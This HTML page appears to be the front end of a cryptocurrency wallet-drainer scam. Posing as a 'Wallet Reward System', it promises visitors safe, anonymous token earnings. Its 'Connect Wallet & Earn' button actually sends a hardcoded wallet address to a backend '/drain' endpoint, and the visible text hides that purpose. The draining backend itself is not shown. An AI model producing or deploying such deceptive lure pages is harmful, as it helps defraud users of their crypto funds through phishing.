<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Wallet Reward System - Earn Tokens</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0f0f0f;
      color: #fff;
      text-align: center;
      padding: 50px;
    }
    h1 {
      color: #00ffcc;
      font-size: 32px;
    }
    p {
      font-size: 16px;
      color: #ccc;
      margin: 10px 0;
    }
    .buttons {
      margin-top: 30px;
    }
    button {
      padding: 15px 30px;
      font-size: 18px;
      background-color: #00ffcc;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      margin: 10px;
    }
    button:hover {
      background-color: #00ccaa;
    }
    #result {
      margin-top: 30px;
      font-size: 18px;
      color: #00ffcc;
    }
  </style>
</head>
<body>
  <h1>Wallet Reward System</h1>
  <p>Connect your wallet and start earning tokens in your wallet!</p>
  <p>It's safe, fast, and completely anonymous. All your tokens will be sent to a secure wallet for you.</p>
  <div class="buttons">
    <button onclick="connectWallet()">Connect Wallet & Earn</button>
  </div>
  <div id="result"></div>

  <script>
    async function connectWallet() {
      const response = await fetch('http://localhost:3000/drain', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ fromAddress: '0x81A77e3386006a52a5C4ED8989E00768c4c38a93' }),
      });

      const result = await response.text();
      document.getElementById('result').innerText = result;
    }
  </script>
</body>
</html>
